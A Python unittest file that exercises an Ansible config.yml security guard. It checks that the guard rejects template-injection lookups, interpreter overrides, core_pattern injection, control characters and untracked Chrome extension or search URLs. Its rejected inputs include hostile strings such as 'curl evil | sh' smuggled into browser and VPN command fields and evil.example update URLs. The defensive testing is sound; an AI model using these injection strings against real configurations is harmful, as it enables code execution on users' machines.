#!/usr/bin/env python3
"""Regression coverage for raw YAML parsing before template-injection checks."""
import importlib.util
import json
import os
from pathlib import Path
import re
import shutil
import subprocess
import sys
import tempfile
import unittest

import yaml

ROOT = Path(__file__).resolve().parent.parent
ANSIBLE = ROOT / '.venv/bin/ansible-playbook'
if not ANSIBLE.exists():
    ANSIBLE = Path(shutil.which('ansible-playbook'))
TEST_TIMEOUT = max(60, int(os.environ.get('LAPTOP_SETUP_TEST_TIMEOUT', '0')))

spec = importlib.util.spec_from_file_location("config_parser", Path(__file__).with_name("parse-config.py"))
parser = importlib.util.module_from_spec(spec)
spec.loader.exec_module(parser)


class ConfigParserTests(unittest.TestCase):
    def parse(self, content):
        return json.loads(parser.parse_config(content))

    def test_preserves_yaml_types_and_unsafe_literals(self):
        self.assertEqual(
            self.parse("name: !unsafe 'Valid User'\nenabled: true\ncount: 3\npaths: [one, two]\n"),
            {"name": "Valid User", "enabled": True, "count": 3, "paths": ["one", "two"]},
        )

    def test_keeps_template_markers_without_executing_lookups(self):
        with tempfile.TemporaryDirectory() as directory:
            marker = Path(directory) / "executed"
            payload = "{{ lookup('pipe', 'touch " + str(marker) + "') }}"
            for content in (
                'value: "' + payload + '"\n',
                'value: !unsafe "' + payload + '"\n',
                'value: ["' + payload + '"]\n',
                'nested:\n  value: "' + payload + '"\n',
            ):
                with self.subTest(content=content):
                    self.assertIn(payload, json.dumps(self.parse(content)))
                    self.assertFalse(marker.exists())

    def test_rejects_python_object_tags(self):
        with self.assertRaises(Exception):
            self.parse("value: !!python/object/apply:os.getpid []\n")

    def test_preserves_literal_unsafe_word_inside_a_string(self):
        self.assertEqual(self.parse("value: 'literal !unsafe text'"), {"value": "literal !unsafe text"})

    def test_empty_document_is_an_empty_mapping(self):
        self.assertEqual(self.parse(""), {})

    def test_rejects_non_mapping_documents(self):
        for content in ("[one, two]", "123", "some text"):
            with self.subTest(content=content), self.assertRaises(TypeError):
                self.parse(content)


class ConfigPolicyTests(unittest.TestCase):
    """config.yml keys and characters that would change what runs, or how, are rejected."""

    def violations(self, content):
        return parser.policy_violations(parser.load(content))

    def assertRejected(self, content, needle):
        found = self.violations(content)
        self.assertTrue(any(needle in line for line in found), found)

    def test_default_config_and_ordinary_values_pass(self):
        self.assertEqual(self.violations((ROOT / 'default.config.yml').read_text()), [])
        self.assertEqual(self.violations(
            "dotfiles_user_name: Zoë Ünïcode\nrollout_enable: [ssh_client]\nssh_port: 722\n"
            "system_sysctl_extra: {vm.swappiness: 10}\nsystem_usbguard_extra_rules: ['allow id 046d:c52b']\n"), [])

    def test_rejects_ansible_connection_and_behaviour_keys(self):
        for key in ['ansible_python_interpreter', 'ansible_become_exe', 'ansible_become_user', 'ansible_become_method',
                    'ansible_shell_executable', 'ansible_connection', 'ANSIBLE_python_interpreter']:
            with self.subTest(key=key):
                self.assertRejected(key + ': /tmp/x\n', repr(key))
        # ansible_facts from config.yml would beat gathered and package facts (repo cleanup, architecture guards)
        self.assertRejected('ansible_facts:\n  packages: {}\n  architecture: x86_64\n', repr('ansible_facts'))

    def test_rejects_internal_and_protected_keys(self):
        for key in ['_csb_molecule_force', '_pf_vault_asserted', '_rollout_disabled', '_system_sysctl_work_defaults',
                    '_anything', 'csb_rhel', 'system_sysctl_hardening', 'common_project_root', 'rollout_catalog']:
            with self.subTest(key=key):
                self.assertRejected(key + ': true\n', repr(key))
        self.assertEqual(self.violations('rollout_enable: all\n'), [])

    def test_protected_keys_come_from_the_wrapper(self):
        wrapper = (ROOT / 'scripts/verify-ansible-args.sh').read_text()
        self.assertIn("_protected_keys='" + parser.protected_keys_pattern().pattern + "'", wrapper)
        with tempfile.TemporaryDirectory() as directory:  # fail closed when the list cannot be read
            (Path(directory) / 'scripts').mkdir()
            (Path(directory) / 'scripts/verify-ansible-args.sh').write_text('#!/bin/bash\n')
            with self.assertRaises(parser.PolicySourceError):
                parser.protected_keys_pattern(Path(directory))

    def vars_root(self, directory, files):
        root = Path(directory)
        for name, text in dict({'vars.yml': 'mapped_secret: "{{ vault_mapped_secret | default(\'\') }}"\n'}, **files).items():
            (root / 'group_vars/all').mkdir(parents=True, exist_ok=True)
            (root / 'group_vars/all' / name).write_text(text)
        return root

    def test_vars_files_with_ansible_tags_or_lists_still_load(self):
        with tempfile.TemporaryDirectory() as directory:
            root = self.vars_root(directory, {
                'local_repos.yml': "git_repos_local: !unsafe [{url: 'git@internal.example:a/b.git'}]\n"
                                   "tagged: !unsafe '{{ vault_tagged }}'\n"
                                   "secret: !vault |\n  $ANSIBLE_VAULT;1.1;AES256\n  3132\n",
                'list.yml': '- one\n- two\n', 'empty.yml': ''})
            self.assertEqual(parser.vault_mappings(root), {'mapped_secret': {'vault_mapped_secret'}, 'tagged': {'vault_tagged'}})

    def test_unreadable_vars_file_error_names_the_file_not_its_content(self):
        with tempfile.TemporaryDirectory() as directory:
            root = self.vars_root(directory, {'local_repos.yml': 'repos: [git@internal-secret-host.example:x\n  bad: {\n'})
            with self.assertRaises(parser.PolicySourceError) as raised:
                parser.vault_mappings(root)
            self.assertIn('local_repos.yml', str(raised.exception))
            self.assertNotIn('internal-secret-host', str(raised.exception))
            self.assertIsNone(raised.exception.__cause__)

    def test_rejects_magic_variables(self):
        for key in ['omit', 'inventory_hostname', 'group_names', 'inventory_dir', 'role_path', 'hostvars',
                    'playbook_dir', 'environment', 'vars', 'item', 'cacheable']:
            with self.subTest(key=key):
                self.assertRejected(key + ': "0777"\n', repr(key))

    def test_rejects_template_globals(self):
        """A config key named like a template global shadows it: `lookup: 0` breaks every later lookup()."""
        from ansible._internal._templating._jinja_bits import AnsibleEnvironment
        names = set(AnsibleEnvironment().globals) | {'zip'}
        self.assertTrue({'lookup', 'query', 'q', 'now', 'undef', 'range', 'dict', 'lipsum', 'namespace'} <= names)
        for key in sorted(names):
            with self.subTest(key=key):
                self.assertRejected(key + ': 0\n', repr(key))

    def test_rejects_every_name_mapped_from_the_vault(self):
        for key in ['acli_api_token', 'drive_sync_client_id', 'drive_sync_client_secret', 'codex_api_key',
                    'ssh_auth_key', 'ssh_auth_key_pub', 'ssh_signing_key', 'rh_git_key', 'registry_tokens',
                    'notes_transcrypt_password', 'system_grub_password_hash']:
            with self.subTest(key=key):
                self.assertRejected(key + ': x\n', repr(key))

    def test_every_vault_variable_is_mapped(self):
        """A new vault_* variable needs a mapping that the derived shadow list can see."""
        stub = (ROOT / 'group_vars/all/vault.yml').read_text()
        documented = set(re.findall(r'\bvault_[A-Za-z0-9_]+', stub)) - {'vault_placeholder'}
        self.assertIn('vault_grub_password_hash', documented)  # named in the stub's comments only
        mapped = set().union(*parser.vault_mappings().values())
        self.assertEqual(documented - mapped, set())

    def test_rejects_control_characters_in_keys_and_values(self):
        for content, needle in [
                ('system_sysctl_extra:\n  vm.swappiness: "1\\0kernel.core_pattern = |/tmp/x %p"\n', 'U+0000'),
                ('value: "a\\rb"\n', 'U+000D'), ('value: "a\\tb"\n', 'U+0009'), ('value: "722\\n"\n', 'U+000A'),
                ('value: ["ok", "a\\x1bb"]\n', 'U+001B'), ('value: "a\\x7f"\n', 'U+007F'),
                ('nested:\n  "k\\0ey": 1\n', 'U+0000'), ('"top\\x01": 1\n', 'U+0001'),
                ('value: "a\\x85b"\n', 'U+0085'), ('value: "a\\x9fb"\n', 'U+009F'),
                ('value: "a\\u2028b"\n', 'U+2028'), ('value: "a\\u2029b"\n', 'U+2029')]:
            with self.subTest(content=content):
                self.assertRejected(content, needle)

    def test_messages_name_keys_never_values(self):
        found = self.violations('ansible_become_exe: /tmp/SECRETVALUE\nvalue: "SECRET\\0VALUE"\n')
        self.assertEqual(len(found), 2, found)
        self.assertNotIn('SECRET', '\n'.join(found))

    # --- User-level commands, Chrome policy, the queue and vm.mmap_min_addr (the roles check the same at use) ---
    def test_browser_and_terminal_are_known_commands(self):
        for content in ['desktop_wm_browser: google-chrome\n', 'desktop_terminal: ghostty\n', 'desktop_terminal: terminal\n',
                        'desktop_terminal: foot\n']:
            with self.subTest(content=content):
                self.assertEqual(self.violations(content), [])
        for content in ['desktop_wm_browser: "firefox; curl evil | sh"\n', 'desktop_wm_browser: /usr/bin/firefox\n',
                        'desktop_terminal: "alacritty -e sh -c evil"\n', 'desktop_terminal: /usr/bin/foot\n',
                        'desktop_terminal: bash\n', 'desktop_terminal: sh\n', 'desktop_terminal: zsh\n',
                        'desktop_wm_browser: sudo\n', 'desktop_wm_browser: env\n', 'desktop_wm_browser: [firefox]\n']:
            with self.subTest(content=content):
                self.assertRejected(content, 'name')
        self.assertRejected('desktop_wm_browser: [firefox, evil]\n', 'not a list')

    def test_vpn_status_command_is_a_read_only_status_shape(self):
        for key in ['desktop_i3status_vpns', 'desktop_i3status_vpns_extra']:
            for command in [['mullvad', 'status'], ['tailscale', 'status', '--json', '--peers=false'], ['netbird', 'status', '-d'], ['wg', 'show', 'wg0'], ['nmcli', '-t', '-f', 'NAME,TYPE', 'connection', 'show', '--active'], ['warp-cli', 'status'], ['openvpn3', 'sessions-list']]:
                with self.subTest(key=key, command=command):
                    self.assertEqual(self.violations(yaml.safe_dump({key: [{'name': 'M', 'command': command,
                                                                            'connected': '^C'}]})), [])
            for command in [['sh', '-c', 'curl evil | sh'], ['/usr/bin/bash', '-c', 'setsid evil'], ['/tmp/x'], ['env', 'tailscale', 'status'], ['tailscale', 'up'], ['tailscale', 'status', '--web'], ['nmcli', 'connection', 'delete', 'x'], ['nmcli', 'radio', 'wifi', 'off', 'connection', 'show', '--active'], ['wg', 'show', 'x', 'y'], ['/usr/bin/wg', 'show'], ['mullvad', 'status', 'listen'], ['wg', 'show', 'a b']] + [[], 'mullvad status']:
                with self.subTest(key=key, command=command):
                    self.assertRejected(yaml.safe_dump({key: [{'name': 'M', 'command': command, 'connected': '^C'}]}),
                                        'not a read-only VPN status command')

    def test_chrome_policies_are_supported_and_extensions_tracked(self):
        for key in ['desktop_chrome_policies_enforced', 'desktop_chrome_policies_recommended_extra',
                    'desktop_chrome_policies_recommended']:
            for policy in [{'ExtensionInstallForcelist': ['ddkjiahejlhfcafbddmgiahcphecmpfh']}, {'ExtensionInstallForcelist': ['ddkjiahejlhfcafbddmgiahcphecmpfh;https://clients2.google.com/service/update2/crx']}, {'ExtensionSettings': {'ddkjiahejlhfcafbddmgiahcphecmpfh': {'installation_mode': 'force_installed', 'toolbar_pin': 'force_pinned'}, '*': {'installation_mode': 'blocked', 'blocked_permissions': ['debugger']}}}, {'ExtensionInstallAllowlist': ['ddkjiahejlhfcafbddmgiahcphecmpfh']}, {'ExtensionInstallBlocklist': ['*', 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa']}, {'BookmarkBarEnabled': True}]:
                with self.subTest(key=key, policy=policy):
                    self.assertEqual(self.violations(yaml.safe_dump({key: policy})), [])
            for policy in [{'ExtensionInstallForcelist': ['aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa']}, {'ExtensionInstallForcelist': ['ddkjiahejlhfcafbddmgiahcphecmpfh;https://evil.example/u.xml']}, {'ExtensionSettings': {'*': {'installation_mode': 'allowed', 'runtime_allowed_hosts': ['*://*/*']}}}, {'ExtensionSettings': {'*': {'runtime_allowed_hosts': ['*://*/*']}}}, {'ExtensionSettings': {'*': {'installation_mode': 'force_installed'}}}, {'ExtensionSettings': {'*': {'allowed_types': ['extension']}}}, {'ExtensionSettings': {'*': {'install_sources': ['https://evil.example/*']}}}, {'ExtensionSettings': {'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa': {'installation_mode': 'force_installed'}}}, {'ExtensionSettings': {'ddkjiahejlhfcafbddmgiahcphecmpfh': {'runtime_allowed_hosts': ['*://*/*']}}}, {'ExtensionSettings': {'ddkjiahejlhfcafbddmgiahcphecmpfh': {'update_url': 'https://evil.example/u.xml'}}}, {'ExtensionInstallAllowlist': ['aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa']}, {'ExtensionInstallAllowlist': ['*']}, {'URLAllowlist': ['*']}]:
                with self.subTest(key=key, policy=policy):
                    found = self.violations(yaml.safe_dump({key: policy}))
                    self.assertTrue(any(key in line for line in found), found)

    def test_extension_lists_only_name_tracked_ids(self):
        defaults = yaml.safe_load((ROOT / 'roles/desktop/defaults/main.yml').read_text())
        # the tracked allowlist is the #194 set and nothing more
        self.assertEqual(sorted(defaults['desktop_chrome_extensions_allowed']),
                         sorted(e['id'] for e in defaults['desktop_chrome_extensions']))
        for key in ['desktop_chrome_extensions_extra', 'desktop_chrome_extensions']:
            with self.subTest(key=key):
                self.assertEqual(self.violations(yaml.safe_dump({key: [{'id': 'nngceckbapebfimnlniiiahkandclblb'},
                                                                       {'id': 'fcoeoabgfenejglbffodgkkbkcdhcgfn',
                                                                        'install': False}]})), [])
                for entries in [[{'id': 'a' * 32}], [{'id': 'b' * 32, 'install': False}], ['a' * 32], 'x']:
                    with self.subTest(key=key, entries=entries):
                        self.assertRejected(yaml.safe_dump({key: entries}), 'desktop_chrome_extensions_allowed')
        self.assertRejected('desktop_chrome_extensions_allowed: [%s]\n' % ('a' * 32), 'add an extension ID there by PR')

    def test_search_provider_urls_are_exact_tracked_urls(self):
        for name, value in [('DefaultSearchProviderSearchURL', 'https://www.google.com/search?q={searchTerms}'), ('DefaultSearchProviderSearchURL', 'https://duckduckgo.com/?q={searchTerms}'), ('DefaultSearchProviderSearchURL', 'https://www.google.com/search?{google:RLZ}q={searchTerms}'), ('DefaultSearchProviderAlternateURLs', ['https://www.bing.com/search?q={searchTerms}']), ('DefaultSearchProviderSuggestURL', 'https://www.google.com/complete/search?client=chrome&q={searchTerms}'), ('DefaultSearchProviderNewTabURL', 'https://www.google.com/')]:
            with self.subTest(name=name, value=value):
                self.assertEqual(self.violations(yaml.safe_dump({'desktop_chrome_policies_enforced': {name: value}})), [])
        for name, value in [('DefaultSearchProviderSearchURL', 'https://script.google.com/macros/s/ATTACKER/exec?q={searchTerms}'), ('DefaultSearchProviderSearchURL', 'https://sites.google.com/view/x?q={searchTerms}'), ('DefaultSearchProviderSearchURL', 'https://www.google.com/url?q=https://evil.example/'), ('DefaultSearchProviderSearchURL', 'https://google.com/search?q={searchTerms}'), ('DefaultSearchProviderSearchURL', 'https://www.google.com:443/search?q={searchTerms}'), ('DefaultSearchProviderSearchURL', 'https://www.google.com/search/../url?q=x'), ('DefaultSearchProviderSearchURL', 'https://evil.example\\@www.google.com/search?q=x'), ('DefaultSearchProviderSearchURL', 'https://www.google.com\\.evil.example/search?q=x'), ('DefaultSearchProviderSearchURL', 'https://user@www.google.com/search?q=x'), ('DefaultSearchProviderSearchURL', 'https://www.google.com/search#@evil.example'), ('DefaultSearchProviderSearchURL', 'http://www.google.com/search'), ('DefaultSearchProviderSearchURL', ' https://www.google.com/search'), ('DefaultSearchProviderSearchURL', 'https://www.google.com/complete/search?q=x'), ('DefaultSearchProviderAlternateURLs', ['https://www.google.com/search', 'https://evil.example/s']), ('DefaultSearchProviderSuggestURL', 'https://www.google.com/search?q=x'), ('DefaultSearchProviderNewTabURL', 'https://www.google.com/?evil=1'), ('DefaultSearchProviderNewTabURL', 'https://www.google.com/url?q=https://evil.example/'), ('DefaultSearchProviderImageURL', 'https://www.google.com/searchbyimage')]:
            with self.subTest(name=name, value=value):
                found = self.violations(yaml.safe_dump({'desktop_chrome_policies_enforced': {name: value}}))
                self.assertTrue(any(name in line for line in found), found)
        self.assertRejected('desktop_chrome_search_urls: {search: [https://evil.example/]}\n', 'desktop_chrome_search_urls')

    def test_claude_config_dirs_inside_home_outside_the_repo(self):
        home = str(Path.home())
        for value in ['%s/.claude' % home, '%s/.claude-work' % home, '%s/.config/claude' % home]:
            with self.subTest(value=value):
                self.assertEqual(self.violations('claude_work_config_dir: %s\n' % value), [])
        for value in ['%s/../x/.claude' % home, '%s/./.claude' % home, '/tmp/.claude', home, str(ROOT),
                      str(ROOT / 'toolbox/.claude'), '%s/code/project/.claude' % home, '%s/.claude/../x' % home]:
            for key in ['claude_default_config_dir', 'claude_queue_config_dir', 'claude_runtime_config_dir']:
                with self.subTest(key=key, value=value):
                    self.assertRejected('%s: %s\n' % (key, value), repr(key))
        self.assertRejected('claude_extra_config_dirs: [%s]\n' % str(ROOT / '.claude-x'), 'claude_extra_config_dirs')

    def test_queue_repo_authors_and_sandbox(self):
        owner = 'claude_sandbox_enabled: true\nclaude_queue_enabled: true\n'
        self.assertEqual(self.violations(owner + 'claude_queue_repo: DFarrell07/tasks\n'
                                         'claude_queue_allowed_authors: [dfarrell07]\n'), [])
        # dotfiles_github_user is config.yml too: it cannot vouch for an attacker's repo or login
        attacker = owner + 'dotfiles_github_user: attacker\n'
        self.assertRejected(attacker + 'claude_queue_repo: attacker/tasks\nclaude_queue_allowed_authors: [dfarrell07]\n',
                            'claude_queue_repo')
        for name in ['.', '..']:
            with self.subTest(name=name):
                self.assertRejected(owner + 'claude_queue_repo: "dfarrell07/%s"\nclaude_queue_allowed_authors: [dfarrell07]\n'
                                    % name, 'claude_queue_repo')
        self.assertRejected(attacker + 'claude_queue_repo: dfarrell07/tasks\nclaude_queue_allowed_authors: [attacker]\n',
                            'claude_queue_allowed_authors')
        self.assertRejected('claude_queue_enabled: true\nclaude_queue_repo: dfarrell07/t\n'
                            'claude_queue_allowed_authors: [dfarrell07]\n', 'claude_sandbox_enabled')
        for key in ['claude_queue_trusted_repo_owners', 'claude_queue_trusted_authors']:
            with self.subTest(key=key):
                self.assertRejected('%s: [attacker]\n' % key, repr(key))

    def test_sysctl_keys_are_strict_before_normalization(self):
        # the template used to strip characters outside [a-zA-Z0-9._-], turning these into the real key
        for name in ['vm.mmap_min_addr!', ' vm.mmap_min_addr', 'vm.mmap_min_addr ', 'vm.mmap_min_addé', 'vm.mmap_min_addr\u200b', 'kernel.kptr_restrict ', 'kernel.kptr_restrict!', 'Vm.mmap_min_addr', 'vm..mmap_min_addr', 'vm/mmap_min_addr']:
            for key in ['system_sysctl_extra', 'system_sysctl_extra_additional']:
                with self.subTest(name=name, key=key):
                    self.assertRejected(yaml.safe_dump({key: {name: 0}}, allow_unicode=True), 'not a well-formed sysctl key')

    def test_mmap_min_addr_floor(self):
        self.assertEqual(self.violations('system_sysctl_extra: {vm.mmap_min_addr: 65536}\n'), [])
        for content in ['system_sysctl_extra: {vm.mmap_min_addr: 0}\n',
                        'system_sysctl_extra_additional: {"-vm.mmap_min_addr": "4095"}\n',
                        'system_sysctl_extra: {"--vm.mmap_min_addr": 0}\n',
                        'system_sysctl_extra: {vm.mmap_min_addr: x}\n']:
            with self.subTest(content=content):
                self.assertRejected(content, 'vm.mmap_min_addr must be at least 4096')
        # malformed spellings are refused before normalization (test_sysctl_keys_are_strict_before_normalization)
        for content in ['system_sysctl_extra_additional: {"-vm/mmap_min_addr": "4095"}\n',
                        'system_sysctl_extra: {vm..mmap_min_addr: 0}\n']:
            with self.subTest(content=content):
                self.assertRejected(content, 'not a well-formed sysctl key')

    def run_guard(self, config):
        """Run the production guard and pre-flight's config load, then a module."""
        with tempfile.TemporaryDirectory() as directory:
            marker = Path(directory) / 'interpreter-ran'
            interpreter = Path(directory) / 'python'
            interpreter.write_text('#!/bin/sh\ntouch ' + str(marker) + '\nexec ' + str(Path(ANSIBLE).parent / 'python3') + ' "$@"\n')
            interpreter.chmod(0o755)
            (Path(directory) / 'config.yml').write_text(config.replace('INTERPRETER', str(interpreter)))
            (Path(directory) / 'guard.yml').write_text(yaml.safe_dump([{
                'hosts': 'localhost', 'gather_facts': False, 'tasks': [
                    {'name': 'Guard', 'ansible.builtin.include_tasks': str(ROOT / 'common/tasks/config_ssti_guard.yml')},
                    pre_flight_tasks('Load user overrides')[0],
                    {'name': 'Run a module', 'ansible.builtin.command': {'argv': ['true']}, 'changed_when': False}]}]))
            env = dict(os.environ, MOLECULE_PROJECT_DIRECTORY=str(ROOT), ANSIBLE_NOCOLOR='1',
                       ANSIBLE_VAULT_PASSWORD_FILE=str(ROOT / 'scripts/vault-pass-ci.sh'))
            result = subprocess.run([str(ANSIBLE), '-i', 'localhost,', '-c', 'local', 'guard.yml'], cwd=directory,
                                    env=env, capture_output=True, text=True, timeout=TEST_TIMEOUT)
            return result, marker.exists()

    def test_production_guard_rejects_before_loading(self):
        result, ran = self.run_guard('dotfiles_user_name: Valid User\n')
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
        for config in ['ansible_python_interpreter: INTERPRETER\n',
                       'system_sysctl_extra:\n  vm.swappiness: "1\\0kernel.core_pattern = |/tmp/x %p"\n',
                       '_csb_molecule_force: true\n', 'acli_api_token: shadow\n']:
            with self.subTest(config=config):
                result, ran = self.run_guard(config)
                self.assertEqual(result.returncode, 2, result.stdout + result.stderr)
                self.assertIn('Fail when config.yml sets keys or characters that change execution', result.stdout)
                self.assertFalse(ran)


def pre_flight_tasks(*prefixes):
    """Top-level tasks of the pre-flight block whose names start with the given prefixes, in file order."""
    block = yaml.safe_load((ROOT / 'common/tasks/pre_flight_checks.yml').read_text())[0]['block']
    return [task for task in block if task.get('name', '').startswith(prefixes)]


SHADOW_PATHS = ['vars/config.yml', 'common/tasks/config.yml', 'common/tasks/vars/config.yml',
                'vars/default.config.yml', 'common/tasks/default.config.yml', 'common/tasks/vars/default.config.yml']
# Pre-flight's config tasks: the guard (localhost only), the reuse of localhost's checked dict on other hosts, the load
LOAD_PREFIXES = ('Decide whether this play', 'Scan user config', 'Assert the config.yml checked on localhost',
                 'Reuse the config.yml dict',
                 'Load configuration', 'Load user overrides')
SHADOW_PREFIX = ('Assert no copy of config.yml or default.config.yml shadows',)


class Project:
    """A scratch project with the production guard and pre-flight's load tasks, and a marker interpreter."""

    def __init__(self, directory, config='probe_source: checked\n', prefixes=LOAD_PREFIXES):
        self.root = Path(directory)
        self.marker, self.interpreter = self.root / 'interpreter-ran', self.root / 'python'
        self.interpreter.write_text('#!/bin/sh\ntouch ' + str(self.marker) + '\nexec '
                                    + str(Path(ANSIBLE).parent / 'python3') + ' "$@"\n')
        self.interpreter.chmod(0o755)
        self.evil = 'probe_source: planted\nansible_python_interpreter: ' + str(self.interpreter) + '\n'
        shutil.copy(ROOT / 'default.config.yml', self.root / 'default.config.yml')
        (self.root / 'config.yml').write_text(config)
        (self.root / 'common/tasks').mkdir(parents=True)
        (self.root / 'common/tasks/load.yml').write_text(yaml.safe_dump(pre_flight_tasks(*prefixes)))
        shutil.copy(ROOT / 'common/tasks/config_ssti_guard.yml', self.root / 'common/tasks/config_ssti_guard.yml')

    load = [{'name': 'Load as pre-flight does', 'ansible.builtin.include_tasks': 'common/tasks/load.yml'}]

    def plant(self, paths):
        for path in paths:
            (self.root / path).parent.mkdir(parents=True, exist_ok=True)
            (self.root / path).write_text(self.evil)

    def run(self, plays, inventory='localhost,', env=None, args=()):
        env = dict(os.environ, MOLECULE_PROJECT_DIRECTORY=str(ROOT), ANSIBLE_NOCOLOR='1',
                   ANSIBLE_VAULT_PASSWORD_FILE=str(ROOT / 'scripts/vault-pass-ci.sh'), **(env or {}))
        (self.root / 'play.yml').write_text(yaml.safe_dump(plays))
        return subprocess.run([str(ANSIBLE), '-i', inventory, '-c', 'local', 'play.yml', *args], cwd=self.root,
                              env=env, capture_output=True, text=True, timeout=TEST_TIMEOUT)

    def run_probe(self, env=None):
        return self.run([{'hosts': 'localhost', 'gather_facts': False, 'vars': {'common_project_root': str(self.root)},
                          'tasks': self.load + [{'name': 'Report', 'ansible.builtin.debug': {'msg': 'PROBE={{ probe_source }}'}},
                                                {'name': 'Run a module', 'ansible.builtin.command': {'argv': ['true']},
                                                 'changed_when': False}]}], env=env)


class ConfigShadowTests(unittest.TestCase):
    """A copy of config.yml on Ansible's relative include search path must not load unscanned."""

    def test_loads_only_the_checked_project_root_file(self):
        before = set(Path(tempfile.gettempdir()).glob('*config.yml'))
        with tempfile.TemporaryDirectory() as directory:
            project = Project(directory)
            project.plant(SHADOW_PATHS)
            result = project.run_probe()
            self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
            self.assertIn('PROBE=checked', result.stdout)
            self.assertFalse(project.marker.exists())
        self.assertEqual(set(Path(tempfile.gettempdir()).glob('*config.yml')) - before, set())  # no copies left

    def test_pre_flight_refuses_while_a_shadowing_copy_exists(self):
        for path in [None] + SHADOW_PATHS:
            with self.subTest(path=path), tempfile.TemporaryDirectory() as directory:
                project = Project(directory, prefixes=LOAD_PREFIXES + SHADOW_PREFIX)
                project.plant([path] if path else [])
                result = project.run_probe()
                self.assertEqual(result.returncode, 2 if path else 0, result.stdout + result.stderr)
                if path:
                    self.assertIn('SECURITY: remove ', result.stdout)
                    self.assertIn('/' + path, result.stdout)
                self.assertFalse(project.marker.exists())


class ConfigLoadTests(unittest.TestCase):
    """config.yml values are facts set from the checked dict: they reach later plays and the container host."""

    def test_later_plays_and_the_container_host_see_config_values(self):
        with tempfile.TemporaryDirectory() as directory:
            project = Project(directory, config='probe_source: checked\nprofile: personal\nssh_port: 2222\n'
                                                'probe_list: [a, 1]\n')
            inventory = project.root / 'inventory'
            inventory.write_text('localhost ansible_connection=local\n[containers]\ncontainer1 ansible_connection=local '
                                 'ansible_python_interpreter=' + str(Path(ANSIBLE).parent / 'python3') + '\n')
            report = {'name': 'Report', 'ansible.builtin.debug': {
                'msg': "{{ play }}|{{ probe_source }}|{{ profile }}|{{ ssh_port | type_debug }}|{{ probe_list | join(',') }}|"
                       "{{ probe_list[1] | type_debug }}"}}
            roots = {'common_project_root': str(project.root)}
            result = project.run([
                {'name': 'Play 0', 'hosts': 'localhost', 'gather_facts': False, 'vars': roots, 'tasks': project.load},
                {'name': 'Play 2', 'hosts': 'localhost', 'gather_facts': False, 'vars': {'play': 'PLAY2'}, 'tasks': [report]},
                {'name': 'Play 3', 'hosts': 'container1', 'gather_facts': False, 'vars': dict(roots, play='PLAY3'),
                 'pre_tasks': [
                     {'name': 'Not loaded yet on this host', 'ansible.builtin.assert': {'that': 'probe_source is not defined'}},
                     {'name': 'Validate config like site.yml Play 3', 'delegate_to': 'localhost', 'block': project.load}],
                 'tasks': [report]}], inventory=str(inventory))
            self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
            for play in ('PLAY2', 'PLAY3'):  # config.yml beats default.config.yml (profile: work) and keeps types
                self.assertIn(play + '|checked|personal|int|a,1|int', result.stdout)

    def container_run(self, project, plays, args=()):
        inventory = project.root / 'inventory'
        inventory.write_text('localhost ansible_connection=local\n[containers]\ncontainer1 ansible_connection=local '
                             'ansible_python_interpreter=' + str(Path(ANSIBLE).parent / 'python3') + '\n')
        return project.run(plays, inventory=str(inventory), args=args)

    def play3(self, project):
        return {'name': 'Play 3', 'hosts': 'container1', 'gather_facts': False,
                'vars': {'common_project_root': str(project.root)},
                'pre_tasks': [{'name': 'Validate config like site.yml Play 3', 'delegate_to': 'localhost', 'block': project.load}],
                'tasks': [{'name': 'Report', 'ansible.builtin.debug': {
                    'msg': "PLAY3={{ probe_source }}|{{ distrobox_host_exec_commands | default('unset') }}"}}]}

    def test_container_play_reuses_the_config_checked_in_play_0(self):
        """A config.yml rewritten between plays must not reach the container play, even if -e renames the host."""
        for args in [(), ('-e', 'inventory_hostname=localhost'), ('-e', '{"group_names": []}')]:
            with self.subTest(args=args):
                self.rewrite_between_plays(args)

    def rewrite_between_plays(self, args):
        with tempfile.TemporaryDirectory() as directory:
            project = Project(directory)
            rewritten = 'probe_source: rewritten\ndistrobox_host_exec_commands: [bash]\n'
            result = self.container_run(project, [
                {'name': 'Play 0', 'hosts': 'localhost', 'gather_facts': False,
                 'vars': {'common_project_root': str(project.root)}, 'tasks': project.load},
                {'name': 'Play 2 window', 'hosts': 'localhost', 'gather_facts': False, 'tasks': [
                    {'name': 'Rewrite config.yml', 'ansible.builtin.copy': {
                        'dest': str(project.root / 'config.yml'), 'content': rewritten, 'mode': '0600'}}]},
                self.play3(project)], args=args)
            self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
            self.assertIn('PLAY3=checked|unset', result.stdout)

    def test_localhost_in_the_containers_group_reuses_the_checked_config(self):
        """container_name: localhost would put localhost in containers: it must still not reread config.yml."""
        with tempfile.TemporaryDirectory() as directory:
            project = Project(directory)
            result = self.container_run(project, [
                {'name': 'Play 0', 'hosts': 'localhost', 'gather_facts': False,
                 'vars': {'common_project_root': str(project.root)}, 'tasks': project.load},
                {'name': 'Play 2', 'hosts': 'localhost', 'gather_facts': False, 'tasks': [
                    {'name': 'Rewrite config.yml', 'ansible.builtin.copy': {
                        'dest': str(project.root / 'config.yml'), 'content': 'probe_source: rewritten\n', 'mode': '0600'}},
                    {'name': 'Register localhost as the container', 'ansible.builtin.add_host': {
                        'name': 'localhost', 'groups': 'containers'}}]},
                dict(self.play3(project), hosts='containers:&localhost')])
            self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
            self.assertIn('PLAY3=checked|unset', result.stdout)

    def test_runtime_facts_handed_to_the_container_are_refused(self):
        """csb_detect.yml's facts and add_host's non-config values would beat Play 2's values on the container host."""
        names = set()

        def walk(tasks):
            for task in tasks or []:
                names.update(task.get('ansible.builtin.set_fact') or {})
                for key in ('block', 'rescue', 'always'):
                    walk(task.get(key))
        walk(yaml.safe_load((ROOT / 'common/tasks/csb_detect.yml').read_text()))
        distrobox = yaml.safe_load((ROOT / 'roles/distrobox/tasks/main.yml').read_text())
        handover = next(task for task in distrobox if 'ansible.builtin.add_host' in task)['ansible.builtin.add_host']
        names.update(key for key in handover if key not in ('name', 'groups') and not key.startswith('distrobox_'))
        names.discard('cacheable')
        self.assertTrue({'proxy_url', 'network_proxied', 'real_user_home', 'ansible_user'} <= names)
        for name in sorted(names):
            with self.subTest(name=name):
                self.assertTrue(parser.policy_violations({name: 'x'}), name)

